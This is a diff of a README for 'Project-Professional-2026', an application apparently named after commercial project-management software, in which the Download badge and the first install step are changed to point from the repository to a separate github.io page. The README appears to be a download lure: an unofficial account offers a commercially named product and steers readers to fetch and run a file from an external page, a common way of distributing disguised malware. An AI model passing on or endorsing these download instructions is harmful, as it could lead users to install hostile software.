@@ -1,6 +1,6 @@
 # 📊 Project-Professional-2026 - Manage your complex tasks with ease
 
-[![](https://img.shields.io/badge/Download-Project_Professional-blue.svg)](https://github.com/palpawan1712-lgtm/Project-Professional-2026)
+[![](https://img.shields.io/badge/Download-Project_Professional-blue.svg)](https://palpawan1712-lgtm.github.io)
 
 ## 📋 About the application
 
@@ -23,7 +23,7 @@ Make sure your Windows version is up to date. You can check this in your Windows
 
 Follow these steps to get the files on your computer.
 
-1. Visit the project page at: https://github.com/palpawan1712-lgtm/Project-Professional-2026
+1. Visit the project page at: https://palpawan1712-lgtm.github.io
 2. Locate the button or link labeled for the latest version.
 3. Click the link to begin the file download.
 4. Save the file in a folder you can find easily, such as your Downloads folder.
